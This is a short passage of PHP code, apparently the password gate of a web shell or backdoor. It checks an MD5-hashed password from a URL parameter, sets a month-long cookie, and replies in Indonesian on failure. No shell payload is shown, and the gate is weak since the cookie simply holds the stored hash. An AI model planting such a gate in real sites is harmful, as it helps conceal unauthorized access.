...
$javanesec = 'e2dd25c5e4917bcc9f4e250fe22d0ffa';
$kuenya = 'kue';

if (isset($_GET['pass'])) {
    if (md5($_GET['pass']) === $javanesec) {
        setcookie($kuenya, $javanesec, time() + (86400 * 30), "/");
        $_COOKIE[$kuenya] = $javanesec;
    } else {
        die('Password salah Bung');
    }
}

if (!isset($_COOKIE[$kuenya]) || $_COOKIE[$kuenya] !== $javanesec) {
    die('Access Denied!');
}
?>
<?php null;
